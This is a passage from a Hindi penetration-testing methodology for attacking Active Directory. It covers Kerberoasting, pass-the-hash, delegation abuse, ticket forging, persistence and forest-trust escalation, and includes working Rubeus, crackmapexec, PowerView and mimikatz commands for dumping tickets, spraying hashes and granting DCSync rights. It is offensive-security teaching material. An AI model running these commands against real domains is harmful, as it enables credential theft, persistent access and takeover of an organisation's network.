फिर recovered gMSA का मूल्यांकन किसी अन्य credential की तरह करें: local/domain group membership, logon rights, SPNs, delegation और reachable services की जाँच करें, फिर pass-the-hash आज़माएँ। यह ACL-आधारित retrieval path [Golden gMSA/dMSA](golden-dmsa-gmsa.md) से अलग है, जिसमें KDS root-key compromise के बाद managed passwords निकाले जाते हैं।<sup>[[20]](#references)</sup>

किसी computer principal का अन्य computer objects या groups पर outbound control भी हो सकता है। ऐसा principal मिलने के बाद, उसकी nested memberships और effective ACLs की अलग-अलग जाँच करें: किसी दूसरे computer object पर write right से account में बदलाव संभव हो सकता है, और group membership rights से logon role मिल सकता है। Staged-account flag, predictable naming convention या अकेला `GenericWrite` edge, अपने-आप में पूरा path साबित नहीं करता।

किसी file, share या backup में `msDS-ManagedPassword` blob की readable copy होना एक अलग exposure path है: LDAP read ACL कहीं और stored copy की सुरक्षा नहीं कर सकता। इसे interpret करने से पहले पुष्टि करें कि data managed-password blob है, और इसे authorized LDAP read तथा KDS root-key derivation—दोनों से अलग समझें।

### Kerberoast

Kerberoasting में user accounts से जुड़े services द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनके encryption को **offline** crack करना शामिल है—यह encryption user passwords पर आधारित होता है।

इस बारे में अधिक जानकारी:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, आदि)

कुछ credentials प्राप्त करने के बाद, आप जाँच सकते हैं कि क्या आपको किसी **machine** तक access है। इसके लिए, अपने port scans के अनुसार अलग-अलग protocols के साथ कई servers से connect करने का प्रयास करने हेतु **CrackMapExec** इस्तेमाल कर सकते हैं।

### Local Privilege Escalation

यदि आपने credentials या एक regular domain user के रूप में session compromise किया है और domain की **किसी भी machine** तक access कर सकते हैं, तो **locally privileges escalate करने और credentials collect करने** का path खोजें। Local administrator privileges से memory (LSASS) और local storage (SAM) से **अन्य users के hashes dump** करना संभव हो सकता है।

इस book में [**Windows में local privilege escalation**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) पर पूरा page है। [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना भी न भूलें।

### Current Session Tickets

मौजूदा user के **tickets** में ऐसे **tickets मिलने की संभावना बहुत कम है जो आपको** अनपेक्षित resources तक access की permission **दें**, लेकिन आप जाँच सकते हैं:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Domain credentials या user session के साथ, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) पर दोबारा गौर करें: authenticated enumeration और coercion techniques से ऐसे relay paths सामने आ सकते हैं, जो unauthenticated reconnaissance के दौरान उपलब्ध नहीं थे।

### Computer Shares | SMB Shares में Creds ढूँढना

अब जब आपके पास कुछ basic credentials हैं, तो आपको जाँचना चाहिए कि क्या आप **AD के अंदर साझा की जा रही कोई दिलचस्प files ढूँढ** सकते हैं। आप यह काम manually कर सकते हैं, लेकिन यह बहुत उबाऊ और दोहराव वाला काम है (खासकर तब, जब आपको सैकड़ों docs मिलें जिन्हें जाँचना हो)।

[**यहाँ क्लिक करके जानें कि आप किन tools का इस्तेमाल कर सकते हैं।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds चुराना

अगर आप **दूसरे PCs या shares तक पहुँच सकते हैं**, तो आप **files रख** सकते हैं (जैसे SCF file), जिन्हें किसी तरह access करने पर **आपके विरुद्ध NTLM authentication ट्रिगर होगा**, जिससे आप **NTLM challenge चुरा** सकेंगे और उसे crack कर सकेंगे:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability से कोई भी authenticated user **domain controller को compromise** कर सकता था।


{{#ref}}
printnightmare.md
{{#endref}}

## विशेषाधिकार प्राप्त credentials/session के साथ Active Directory में Privilege escalation

**नीचे दी गई techniques के लिए एक सामान्य domain user पर्याप्त नहीं है; इन attacks को करने के लिए आपको कुछ विशेष privileges/credentials की ज़रूरत है।**

### Hash extraction

उम्मीद है कि आप [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relaying सहित [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), या [स्थानीय रूप से privileges बढ़ाकर](../windows-local-privilege-escalation/index.html) किसी **local admin** account को **compromise** कर पाए होंगे।\
अब memory और local system से सभी hashes dump करने का समय है।\
[**Hashes हासिल करने के अलग-अलग तरीकों के बारे में इस पेज पर पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**किसी user का hash मिलने के बाद**, आप उसका **impersonate** करने के लिए इसका इस्तेमाल कर सकते हैं।\
आपको ऐसा **tool** इस्तेमाल करना होगा जो उस **hash का इस्तेमाल करके NTLM authentication** करे, **या** आप नया **sessionlogon** बनाकर उस **hash को LSASS में inject** कर सकते हैं, ताकि कोई भी **NTLM authentication होने पर उस hash का इस्तेमाल किया जाए।** यही आखिरी तरीका mimikatz इस्तेमाल करता है।\
[**अधिक जानकारी के लिए यह पेज पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

इस attack का उद्देश्य **user NTLM hash का इस्तेमाल करके Kerberos tickets माँगना** है, जो सामान्य Pass The Hash over NTLM protocol का विकल्प है। इसलिए, यह उन networks में विशेष रूप से **उपयोगी हो सकता है जहाँ NTLM protocol disabled है** और authentication protocol के रूप में केवल **Kerberos की अनुमति है**।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** attack method में, attackers किसी user का password या hash values चुराने के बजाय उसका **authentication ticket चुराते हैं**। फिर इस चुराए गए ticket का इस्तेमाल **user का impersonate करने** और network के अंदर resources तथा services तक unauthorized access पाने के लिए किया जाता है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials का दोबारा इस्तेमाल

अगर आपके पास किसी **local administrator** का **hash** या **password** है, तो आपको उससे दूसरे **PCs** पर **locally login** करने की कोशिश करनी चाहिए।

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> ध्यान दें कि यह काफी **noisy** है और **LAPS** इसे **mitigate** कर देगा।

### MSSQL Abuse & Trusted Links

यदि किसी user के पास **access MSSQL instances** के privileges हैं, तो वह MSSQL host पर **execute commands** कर सकता है (यदि वह SA के रूप में चल रहा हो), NetNTLM **hash** **steal** कर सकता है या **relay attack** भी कर सकता है।\
यदि कोई MSSQL instance किसी दूसरे instance द्वारा database link के ज़रिए trusted है, तो linked database पर privileges रखने वाला user इस trust relationship का **use करके दूसरे instance पर queries execute** कर सकता है। इन trusts को chain किया जा सकता है और अंततः ऐसे misconfigured database तक पहुँचा जा सकता है जहाँ user commands execute कर सकता है।\
**Databases के बीच links forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms का abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुँचने के शक्तिशाली रास्ते देते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आपको ऐसा कोई Computer object मिलता है जिसमें [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute है और आपके पास उस computer पर domain privileges हैं, तो आप उस computer पर login करने वाले हर user के memory से TGTs dump कर सकते हैं।\
इसलिए, यदि कोई **Domain Admin computer पर login करता है**, तो आप उसका TGT dump कर सकते हैं और [Pass the Ticket](pass-the-ticket.md) का use करके उसका impersonate कर सकते हैं।\
Constrained delegation की मदद से आप **Print Server को automatically compromise** भी कर सकते हैं (उम्मीद है कि वह DC होगा)।


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है, तो वह **computer की कुछ services access करने के लिए किसी भी user का impersonate** कर सकता है।\
इसलिए, यदि आप इस user/computer का **hash compromise** कर लेते हैं, तो आप **कुछ services access करने के लिए किसी भी user** (यहाँ तक कि domain admins) का impersonate कर सकते हैं।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution प्राप्त किया जा सकता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर **दिलचस्प privileges** हो सकते हैं, जिनकी मदद से आप बाद में lateral **move** कर सकते हैं या privileges **escalate** कर सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service का abuse

Domain में **Spool service listening** का पता चलने पर इसका **abuse** करके **नई credentials हासिल** की जा सकती हैं और **privileges escalate** किए जा सकते हैं।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third-party sessions का abuse

यदि **दूसरे users** **compromised** machine को **access** करते हैं, तो memory से **credentials gather** करना और उनका impersonate करने के लिए उनके processes में beacons **inject** करना भी संभव है।\
आमतौर पर users RDP के ज़रिए system access करते हैं, इसलिए यहाँ third-party RDP sessions पर कुछ attacks करने का तरीका दिया गया है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने का system देता है, जिससे यह सुनिश्चित होता है कि password **randomized**, unique और बार-बार **changed** हो। ये passwords Active Directory में stored होते हैं और authorized users तक access सीमित करने के लिए ACLs का use किया जाता है। इन passwords को access करने के पर्याप्त permissions होने पर दूसरे computers तक pivot करना संभव हो जाता है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Certificate theft या template abuse की कोशिश से पहले AD CS enrollment, certificate mapping और enumeration के लिए [AD Certificates overview](ad-certificates.md) देखें।

Compromised machine से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configured हैं, तो privileges escalate करने के लिए उनका abuse करना संभव है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## High-privilege account के साथ post-exploitation

### Domain Credentials dump करना

**Domain Admin** या इससे भी बेहतर **Enterprise Admin** privileges मिलने के बाद, आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहाँ है**](dcsync.md)।

[**NTDS.dit को steal करने के तरीके के बारे में अधिक जानकारी यहाँ है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit` और `SYSTEM` hive वाली readable backup archive को extraction से पहले ही exposed directory material माना जाना चाहिए। पुराना password hash होने से अन्य object attributes सुरक्षित नहीं हो जाते: `description` जैसे fields में credentials या operational notes हो सकते हैं। पहले archive member names देखें और extracted database contents को routine enumeration output से बाहर रखें।

### Persistence के रूप में Privesc

पहले चर्चा की गई कुछ techniques का use persistence के लिए किया जा सकता है।\
उदाहरण के लिए, आप यह कर सकते हैं:

- Users को [**Kerberoast**](kerberoast.md) के लिए vulnerable बनाना

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- उपयोगकर्ताओं को [**ASREPRoast**](asreproast.md) के प्रति असुरक्षित बनाएं

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- किसी उपयोगकर्ता को [**DCSync**](#dcsync) विशेषाधिकार दें

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** में किसी विशिष्ट service के लिए **NTLM hash** (उदाहरण के लिए, **PC account का hash**) का उपयोग करके एक **वैध Ticket Granting Service (TGS) ticket** बनाया जाता है। इस तरीके का उपयोग **service privileges तक पहुँचने** के लिए किया जाता है।


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker को Active Directory (AD) environment में **krbtgt account का NTLM hash** प्राप्त होता है। यह account विशेष है, क्योंकि इसका उपयोग सभी **Ticket Granting Tickets (TGTs)** पर हस्ताक्षर करने के लिए किया जाता है। AD network में authentication के लिए ये tickets आवश्यक हैं।

यह hash मिलने के बाद, attacker अपनी पसंद के किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets जैसे होते हैं, लेकिन इन्हें इस तरह forge किया जाता है कि **आम golden ticket detection mechanisms को bypass किया जा सके।**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**किसी account के certificates होना या उन्हें request कर पाना**, उस user के account में persistence बनाए रखने का बहुत अच्छा तरीका है (भले ही वह password बदल दे):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग करके domain में उच्च privileges के साथ persistence बनाए रखना भी संभव है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object, **privileged groups** (जैसे Domain Admins और Enterprise Admins) पर एक मानक **Access Control List (ACL)** लागू करके उनकी सुरक्षा सुनिश्चित करता है, ताकि अनधिकृत बदलावों को रोका जा सके। हालांकि, इस feature का दुरुपयोग किया जा सकता है: यदि attacker AdminSDHolder की ACL में बदलाव करके किसी सामान्य user को पूरा access दे दे, तो उस user को सभी privileged groups पर व्यापक नियंत्रण मिल जाता है। इस तरह सुरक्षा के लिए बनाया गया यह उपाय उल्टा असर डाल सकता है और अनधिकृत access दे सकता है, जब तक कि इसकी बारीकी से निगरानी न की जाए।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहाँ।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी machine पर admin rights प्राप्त करने के बाद, **mimikatz** का उपयोग करके local Administrator hash निकाला जा सकता है। इसके बाद, **इस password का उपयोग सक्षम करने** के लिए registry में बदलाव करना ज़रूरी है, जिससे local Administrator account तक remote access मिल सके।


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी **user** को कुछ खास domain objects पर **विशेष permissions दे सकते हैं**, जिनकी मदद से वह user **भविष्य में privileges escalate** कर सकता है।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग यह **store करने** के लिए किया जाता है कि किसी **object** के पास दूसरे **object** पर कौन-सी **permissions** हैं। किसी object के **security descriptor** में बस **थोड़ा-सा बदलाव** करके, privileged group का member बने बिना भी उस object पर बहुत उपयोगी privileges प्राप्त किए जा सकते हैं।


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का दुरुपयोग करके, `entryTTL`/`msDS-Entry-Time-To-Die` के साथ थोड़े समय के लिए मौजूद principals/GPOs/DNS records बनाएँ। ये tombstones छोड़े बिना खुद मिट जाते हैं और LDAP evidence मिटा देते हैं, जबकि orphan SIDs, टूटे हुए `gPLink` references या cached DNS responses बने रहते हैं (उदाहरण के लिए, AdminSDHolder ACE pollution या malicious `gPCFileSysPath`/AD-integrated DNS redirects)।

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

सभी domain accounts तक access पाने के लिए, memory में **LSASS** को बदलकर एक **universal password** बनाएँ।


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[यहाँ जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Machine तक access करने के लिए इस्तेमाल किए गए **credentials** को **clear text** में **capture** करने के लिए आप अपना **SSP** बना सकते हैं।


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **नया Domain Controller** register करता है और उसका उपयोग निर्दिष्ट objects पर attributes (SIDHistory, SPNs...) **push** करने के लिए करता है, बिना उन **modifications** के बारे में कोई **logs** छोड़े। आपके पास **DA** privileges होने चाहिए और आप **root domain** के अंदर होने चाहिए।\
ध्यान दें कि गलत data इस्तेमाल करने पर बहुत भद्दे logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि **LAPS passwords पढ़ने की पर्याप्त permission** होने पर privileges को कैसे escalate किया जा सकता है। हालांकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका अर्थ है कि **एक domain compromise होने से संभावित रूप से पूरा Forest compromise हो सकता है**।<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है, जो एक **domain** के user को दूसरे **domain** के resources तक access करने देता है। यह मूलतः दोनों domains के authentication systems के बीच एक connection बनाता है, जिससे authentication verification आसानी से हो पाता है। जब domains के बीच trust स्थापित होता है, तो वे अपने **Domain Controllers (DCs)** में कुछ विशिष्ट **keys** का आदान-प्रदान करके उन्हें सुरक्षित रखते हैं। ये keys trust की अखंडता के लिए महत्वपूर्ण हैं।

आम तौर पर, यदि कोई user किसी **trusted domain** में service तक access करना चाहता है, तो उसे पहले अपने domain के DC से एक विशेष ticket माँगना होता है, जिसे **inter-realm TGT** कहते हैं। यह TGT उस साझा **key** से encrypt किया जाता है, जिस पर दोनों domains सहमत होते हैं। फिर user service ticket (**TGS**) पाने के लिए यह TGT **trusted domain के DC** को देता है। Trusted domain का DC inter-realm TGT को सफलतापूर्वक validate करने पर TGS जारी करता है, जिससे user को service तक access मिलता है।

**चरण**:

1. **Domain 1** का **client computer**, अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** माँगकर प्रक्रिया शुरू करता है।
2. Client का authentication सफल होने पर DC1 एक नया TGT जारी करता है।
3. इसके बाद client, **Domain 2** के resources तक access करने के लिए आवश्यक **inter-realm TGT**, DC1 से माँगता है।
4. Inter-realm TGT को DC1 और DC2 के बीच two-way domain trust के तहत साझा **trust key** से encrypt किया जाता है।
5. Client inter-realm TGT को **Domain 2 के Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपनी साझा trust key का उपयोग करके inter-realm TGT को verify करता है। TGT वैध होने पर, वह Domain 2 में उस server के लिए **Ticket Granting Service (TGS)** जारी करता है, जिस तक client access करना चाहता है।
7. अंत में, client यह TGS server को देता है। यह server के account hash से encrypt किया गया होता है और इससे client को Domain 2 की service तक access मिलता है।

### Different trusts

यह ध्यान रखना ज़रूरी है कि **trust एकतरफ़ा या दोतरफ़ा हो सकता है**। दोतरफ़ा trust में दोनों domains एक-दूसरे पर trust करते हैं। **एकतरफ़ा** trust में एक domain **trusted** और दूसरा **trusting** domain होता है। इस स्थिति में, आप केवल trusted domain से trusting domain के resources तक access कर पाएँगे।

यदि Domain A, Domain B पर trust करता है, तो A, trusting domain है और B, trusted domain है। इसके अलावा, **Domain A** में यह **Outbound trust** होगा और **Domain B** में **Inbound trust** होगा।

**अलग-अलग trusting relationships**

- **Parent-Child Trusts**: यह उसी forest में एक आम व्यवस्था है, जहाँ child domain अपने parent domain के साथ अपने-आप two-way transitive trust स्थापित करता है। इसका अर्थ है कि authentication requests parent और child के बीच आसानी से जा सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" भी कहा जाता है। ये child domains के बीच referral प्रक्रिया तेज़ करने के लिए स्थापित किए जाते हैं। जटिल forests में, authentication referrals को आम तौर पर forest root तक ऊपर जाना पड़ता है और फिर target domain तक नीचे आना पड़ता है। Cross-links बनाने से यह रास्ता छोटा हो जाता है, जो भौगोलिक रूप से दूर-दूर स्थित environments में विशेष रूप से उपयोगी है।
- **External Trusts**: ये अलग-अलग, असंबंधित domains के बीच स्थापित किए जाते हैं और स्वभाव से non-transitive होते हैं। [Microsoft के documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts उस domain के resources तक access के लिए उपयोगी हैं जो current forest के बाहर हो और forest trust से जुड़ा न हो। External trusts में SID filtering से सुरक्षा मज़बूत होती है।
- **Tree-root Trusts**: ये forest root domain और नए जोड़े गए tree root के बीच अपने-आप स्थापित होते हैं। आम तौर पर कम दिखाई देने वाले tree-root trusts, forest में नए domain trees जोड़ने के लिए महत्वपूर्ण हैं। ये नए trees को एक विशिष्ट domain name बनाए रखने देते हैं और two-way transitivity सुनिश्चित करते हैं। अधिक जानकारी [Microsoft की guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: इस प्रकार का trust, दो forest root domains के बीच two-way transitive trust होता है। सुरक्षा बढ़ाने के लिए इसमें SID filtering भी लागू होती है।
- **MIT Trusts**: ये non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts कुछ विशेष environments के लिए होते हैं, जिन्हें Windows ecosystem से बाहर के Kerberos-based systems के साथ integration की ज़रूरत होती है।

#### **Trusting relationships** में अन्य अंतर

- Trust relationship **transitive** भी हो सकता है (A, B पर trust करता है; B, C पर trust करता है; तो A, C पर trust करता है) या **non-transitive**।
- Trust relationship को **bidirectional trust** (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** (उनमें से केवल एक दूसरे पर trust करता है) के रूप में स्थापित किया जा सकता है।

### Attack Path

1. Trusting relationships की **enumeration** करें।
2. जाँचें कि किसी **security principal** (user/group/computer) को **दूसरे domain** के resources तक **access** है या नहीं; शायद ACE entries के ज़रिए या दूसरे domain के groups का member होने के कारण। **Domains के बीच relationships** देखें (संभवतः trust इसी वजह से बनाया गया था)।
   1. इस स्थिति में kerberoast भी एक और विकल्प हो सकता है।
3. उन **accounts को compromise** करें जो domains के बीच **pivot** कर सकते हैं।

दूसरे domain के resources तक access पाने वाले attackers के लिए तीन मुख्य तरीके हैं:

- **Local Group Membership**: Principals को machines पर local groups में जोड़ा जा सकता है, जैसे किसी server के “Administrators” group में। इससे उन्हें उस machine पर व्यापक नियंत्रण मिलता है।
- **Foreign Domain Group Membership**: Principals, foreign domain के groups के member भी हो सकते हैं। हालांकि, इस तरीके की प्रभावशीलता trust के प्रकार और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी **ACL** में, विशेष रूप से **DACL** के अंदर **ACEs** की entities के रूप में, निर्दिष्ट किया जा सकता है। इससे उन्हें विशिष्ट resources तक access मिलता है। ACLs, DACLs और ACEs के काम करने के तरीके को और गहराई से समझने के लिए, “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” शीर्षक वाला whitepaper एक मूल्यवान resource है।<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** जाँचें। ये **किसी external domain/forest** के user/group होंगे।

आप इसे **Bloodhound** में या powerview का उपयोग करके जाँच सकते हैं:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

डोमेन ट्रस्ट्स को enumerate करने के अन्य तरीके:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरी _Parent_ --> _Child_ के लिए।\
> आप इससे वर्तमान domain द्वारा उपयोग की जाने वाली कुंजी ... कर सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection का उपयोग करके trust का दुरुपयोग करते हुए child/parent domain में Enterprise admin के रूप में privilege escalation करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Active Directory (AD) environments में Configuration Naming Context (NC) का exploit कैसे किया जा सकता है, यह समझना बेहद ज़रूरी है। Configuration NC, forest में configuration data के लिए एक केंद्रीय repository है। यह data forest के हर Domain Controller (DC) पर replicate होता है, और writable DCs में Configuration NC की writable copy रहती है। इसका exploit करने के लिए, आपके पास **किसी DC पर SYSTEM privileges** होने चाहिए, बेहतर होगा कि child DC पर हों।

**GPO को root DC site से link करें**

Configuration NC के Sites container में AD forest के सभी domain-joined computers की sites की जानकारी होती है। किसी भी DC पर SYSTEM privileges के साथ काम करके, attackers GPOs को root DC sites से link कर सकते हैं। इससे इन sites पर लागू policies में बदलाव करके root domain को compromise किया जा सकता है।

विस्तृत जानकारी के लिए, [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) पर शोध देखें।<sup>[[12]](#references)</sup>

**Forest में किसी भी gMSA को compromise करें**

हमले का एक तरीका domain में privileged gMSAs को target करना है। gMSAs के passwords की गणना के लिए ज़रूरी KDS Root key, Configuration NC में stored होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key तक पहुँचना और forest में किसी भी gMSA के passwords की गणना करना संभव है।

विस्तृत विश्लेषण और चरण-दर-चरण मार्गदर्शन यहाँ देखें:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

पूरक delegated MSA attack (BadSuccessor – migration attributes का दुरुपयोग):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

अतिरिक्त बाहरी शोध: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)।<sup>[[13]](#references)</sup>

**Schema change attack**

इस तरीके के लिए धैर्य चाहिए, क्योंकि नए privileged AD objects बनने का इंतज़ार करना पड़ता है। SYSTEM privileges के साथ, attacker किसी भी user को सभी classes पर पूरा control देने के लिए AD Schema में बदलाव कर सकता है। इससे नए बनाए गए AD objects तक अनधिकृत पहुँच और उन पर नियंत्रण मिल सकता है।

आगे पढ़ें: [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)।<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability में Public Key Infrastructure (PKI) objects पर control हासिल करके ऐसा certificate template बनाया जाता है, जो forest में किसी भी user के रूप में authentication की सुविधा देता है। चूँकि PKI objects Configuration NC में रहते हैं, इसलिए writable child DC को compromise करने पर ESC5 attacks किए जा सकते हैं।

इसके बारे में अधिक जानकारी [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) में पढ़ें।<sup>[[15]](#references)</sup> जिन परिस्थितियों में ADCS मौजूद नहीं है, वहाँ attacker ज़रूरी components सेट up कर सकता है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में बताया गया है।<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

इस परिदृश्य में एक बाहरी domain आपके domain पर **trust करता है**, जिससे आपको उस पर **अनिर्धारित permissions** मिलती हैं। आपको यह पता लगाना होगा कि आपके domain के **कौन-से principals** को बाहरी domain पर **किस तरह की access** है, और फिर उसका exploit करने की कोशिश करनी होगी:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
